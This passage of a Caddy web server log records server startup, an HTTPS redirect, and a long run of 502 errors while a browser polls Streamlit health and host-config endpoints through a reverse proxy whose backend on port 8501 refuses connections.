{"level":"info","ts":1784797288.169141,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//127.0.0.1:2019","//localhost:2019","//[::1]:2019"]}
{"level":"info","ts":1784797288.169141,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x1aea7a7c6180"}
{"level":"info","ts":1784797288.174109,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784797288.174109,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"warn","ts":1784797288.1757636,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784797288.1757636,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784797288.1757636,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784797288.1762862,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784797288.1768117,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784797288.1773412,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784797288.1773412,"msg":"serving initial configuration"}
{"level":"info","ts":1784797288.182348,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784883688.182348,"try_again_in":86400}
{"level":"info","ts":1784797288.1829093,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1784829683.1599922,"logger":"http.log.access","msg":"handled request","request":{"remote_ip":"112.158.236.136","remote_port":"44474","client_ip":"112.158.236.136","proto":"HTTP/1.0","method":"GET","host":"121.135.177.38","uri":"/","headers":{"Accept":["text/plain,text/html"]}},"bytes_read":0,"user_id":"","duration":0,"size":0,"status":308,"resp_headers":{"Server":["Caddy"],"Connection":["close"],"Location":["https://121.135.177.38/"],"Content-Type":[]}}
{"level":"info","ts":1784850509.8372655,"msg":"maxprocs: Leaving GOMAXPROCS=8: CPU quota undefined"}
{"level":"info","ts":1784850509.8372655,"msg":"GOMEMLIMIT is updated","GOMEMLIMIT":15325020979,"previous":9223372036854775807}
{"level":"info","ts":1784850509.8372655,"msg":"using config from file","file":"Caddyfile"}
{"level":"info","ts":1784850509.8372655,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1784850509.8372655,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"Caddyfile","line":2}
{"level":"info","ts":1784850509.853942,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//[::1]:2019","//127.0.0.1:2019","//localhost:2019"]}
{"level":"info","ts":1784850509.85445,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0x32c866c15380"}
{"level":"info","ts":1784850509.8587348,"logger":"http.auto_https","msg":"skipping automatic certificate management because one or more matching certificates are already loaded","domain":"kairang.pe.kr","server_name":"srv0"}
{"level":"info","ts":1784850509.8587348,"logger":"http.auto_https","msg":"enabling automatic HTTP->HTTPS redirects","server_name":"srv0"}
{"level":"info","ts":1784850509.859902,"logger":"http","msg":"enabling HTTP/3 listener","addr":":8443"}
{"level":"info","ts":1784850509.8604198,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"warn","ts":1784850509.860938,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"warn","ts":1784850509.860938,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":80"}
{"level":"info","ts":1784850509.860938,"logger":"http.log","msg":"server running","name":"remaining_auto_https_redirects","protocols":["h1","h2","h3"]}
{"level":"info","ts":1784850509.8615084,"msg":"autosaved config (load with --resume flag)","file":"C:\\Users\\jason004\\AppData\\Roaming\\Caddy\\autosave.json"}
{"level":"info","ts":1784850509.8615084,"msg":"serving initial configuration"}
{"level":"info","ts":1784850509.86593,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:C:\\Users\\jason004\\AppData\\Roaming\\Caddy","instance":"505fc9e2-bb4f-4c7b-b4f1-7ef35dc840dc","try_again":1784936909.86593,"try_again_in":86400}
{"level":"info","ts":1784850509.8665342,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"error","ts":1784850696.4547899,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Cookie":["REDACTED"],"Priority":["u=1, i"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Mode":["cors"],"Referer":["https://kairang.pe.kr:8443/"],"Accept-Encoding":["gzip, deflate, br, zstd"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua-Mobile":["?0"],"Accept":["*/*"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Dest":["empty"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.1787262,"status":502,"err_id":"6c4tiwtmn","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850696.4635265,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Accept-Encoding":["gzip, deflate, br, zstd"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua-Mobile":["?0"],"Priority":["u=1, i"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Accept":["*/*"],"Sec-Fetch-Site":["same-origin"],"Referer":["https://kairang.pe.kr:8443/"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Fetch-Dest":["empty"],"Cookie":["REDACTED"],"Sec-Fetch-Mode":["cors"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.1990172,"status":502,"err_id":"rzgait3i8","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850697.024745,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Accept":["*/*"],"Cookie":["REDACTED"],"Sec-Ch-Ua-Mobile":["?0"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Priority":["u=1, i"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Fetch-Dest":["empty"],"Referer":["https://kairang.pe.kr:8443/"],"Accept-Encoding":["gzip, deflate, br, zstd"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Mode":["cors"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.002635,"status":502,"err_id":"4jumz1r9x","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850697.024745,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Sec-Fetch-Mode":["cors"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Ch-Ua-Mobile":["?0"],"Priority":["u=1, i"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Accept":["*/*"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Dest":["empty"],"Referer":["https://kairang.pe.kr:8443/"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Cookie":["REDACTED"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.002635,"status":502,"err_id":"km90u21ae","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850698.0265605,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Referer":["https://kairang.pe.kr:8443/"],"Cookie":["REDACTED"],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Fetch-Dest":["empty"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Accept":["*/*"],"Sec-Fetch-Site":["same-origin"],"Priority":["u=1, i"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Mode":["cors"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0015764,"status":502,"err_id":"pq45y9gjq","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850698.0265605,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Fetch-Dest":["empty"],"Referer":["https://kairang.pe.kr:8443/"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Ch-Ua-Mobile":["?0"],"Accept":["*/*"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Mode":["cors"],"Cookie":["REDACTED"],"Priority":["u=1, i"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Accept-Encoding":["gzip, deflate, br, zstd"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0015764,"status":502,"err_id":"q33gzbzxx","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850699.0296688,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Priority":["u=1, i"],"Accept":["*/*"],"Sec-Fetch-Dest":["empty"],"Accept-Encoding":["gzip, deflate, br, zstd"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Mode":["cors"],"Cookie":["REDACTED"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Referer":["https://kairang.pe.kr:8443/"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0011354,"status":502,"err_id":"46hr3bz80","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850699.0296688,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Sec-Fetch-Dest":["empty"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua-Mobile":["?0"],"Accept":["*/*"],"Referer":["https://kairang.pe.kr:8443/"],"Cookie":["REDACTED"],"Sec-Fetch-Mode":["cors"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Priority":["u=1, i"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Site":["same-origin"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0011354,"status":502,"err_id":"35dhq2b17","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850700.016913,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Priority":["u=1, i"],"Sec-Ch-Ua-Platform":["\"Windows\""],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Fetch-Dest":["empty"],"Cookie":["REDACTED"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Mode":["cors"],"Referer":["https://kairang.pe.kr:8443/"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Sec-Ch-Ua-Mobile":["?0"],"Accept":["*/*"],"Sec-Fetch-Site":["same-origin"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0010432,"status":502,"err_id":"ruj5zzvnn","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850700.016913,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Sec-Fetch-Mode":["cors"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Cookie":["REDACTED"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Accept":["*/*"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Dest":["empty"],"Referer":["https://kairang.pe.kr:8443/"],"Priority":["u=1, i"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua-Mobile":["?0"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0010432,"status":502,"err_id":"99gpa9e12","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850702.0397277,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Mode":["cors"],"Accept-Encoding":["gzip, deflate, br, zstd"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Fetch-Site":["same-origin"],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Fetch-Dest":["empty"],"Referer":["https://kairang.pe.kr:8443/"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Accept":["*/*"],"Cookie":["REDACTED"],"Priority":["u=1, i"],"Sec-Ch-Ua-Platform":["\"Windows\""]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0104059,"status":502,"err_id":"g6av0jqvs","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850702.0397277,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Sec-Fetch-Dest":["empty"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Accept":["*/*"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Cookie":["REDACTED"],"Priority":["u=1, i"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Mode":["cors"],"Referer":["https://kairang.pe.kr:8443/"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0104059,"status":502,"err_id":"nrqwbbwhd","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850705.0323966,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Sec-Fetch-Dest":["empty"],"Referer":["https://kairang.pe.kr:8443/"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Accept-Encoding":["gzip, deflate, br, zstd"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Fetch-Site":["same-origin"],"Cookie":["REDACTED"],"Priority":["u=1, i"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua-Mobile":["?0"],"Accept":["*/*"],"Sec-Fetch-Mode":["cors"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0016543,"status":502,"err_id":"na1h054t5","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850705.0323966,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Accept":["*/*"],"Referer":["https://kairang.pe.kr:8443/"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Fetch-Site":["same-origin"],"Sec-Fetch-Mode":["cors"],"Sec-Fetch-Dest":["empty"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Cookie":["REDACTED"],"Priority":["u=1, i"],"Sec-Ch-Ua-Mobile":["?0"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0016543,"status":502,"err_id":"tueuaxhfw","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850708.036004,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Sec-Ch-Ua-Mobile":["?0"],"Accept":["*/*"],"Sec-Fetch-Dest":["empty"],"Priority":["u=1, i"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Fetch-Mode":["cors"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Site":["same-origin"],"Referer":["https://kairang.pe.kr:8443/"],"Cookie":["REDACTED"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0087187,"status":502,"err_id":"wkjyvmkrq","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850708.036004,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Cookie":["REDACTED"],"Sec-Ch-Ua-Mobile":["?0"],"Accept":["*/*"],"Sec-Fetch-Mode":["cors"],"Sec-Fetch-Dest":["empty"],"Referer":["https://kairang.pe.kr:8443/"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Priority":["u=1, i"],"Sec-Ch-Ua-Platform":["\"Windows\""],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Fetch-Site":["same-origin"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0087187,"status":502,"err_id":"z1jmekia2","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850711.0245738,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Accept-Encoding":["gzip, deflate, br, zstd"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Priority":["u=1, i"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Fetch-Mode":["cors"],"Sec-Fetch-Dest":["empty"],"Referer":["https://kairang.pe.kr:8443/"],"Cookie":["REDACTED"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua-Mobile":["?0"],"Accept":["*/*"],"Sec-Fetch-Site":["same-origin"]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0018746,"status":502,"err_id":"nx10jajg7","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850711.0245738,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/host-config","headers":{"Sec-Fetch-Mode":["cors"],"Sec-Fetch-Dest":["empty"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Ch-Ua-Mobile":["?0"],"Accept-Encoding":["gzip, deflate, br, zstd"],"Priority":["u=1, i"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"],"Accept":["*/*"],"Sec-Fetch-Site":["same-origin"],"Referer":["https://kairang.pe.kr:8443/"],"Cookie":["REDACTED"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""]},"tls":{"resumed":false,"version":772,"cipher_suite":4865,"proto":"h2","server_name":"kairang.pe.kr","ech":false}},"duration":0.0010981,"status":502,"err_id":"dzzjietmc","err_trace":"reverseproxy.statusError (reverseproxy.go:1626)"}
{"level":"error","ts":1784850714.027369,"logger":"http.log.error.log0","msg":"dial tcp [::1]:8501: connectex: No connection could be made because the target machine actively refused it.","request":{"remote_ip":"112.223.35.142","remote_port":"50150","client_ip":"112.223.35.142","proto":"HTTP/2.0","method":"GET","host":"kairang.pe.kr:8443","uri":"/_stcore/health","headers":{"Accept-Encoding":["gzip, deflate, br, zstd"],"Accept-Language":["ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7"],"Sec-Fetch-Mode":["cors"],"Sec-Fetch-Dest":["empty"],"Cookie":["REDACTED"],"Priority":["u=1, i"],"Sec-Ch-Ua-Platform":["\"Windows\""],"Sec-Ch-Ua":["\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\""],"Sec-Ch-Ua-Mobile":["?0"],"Accept":["*/*"],"Sec-Fetch-Site":["same-origin"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 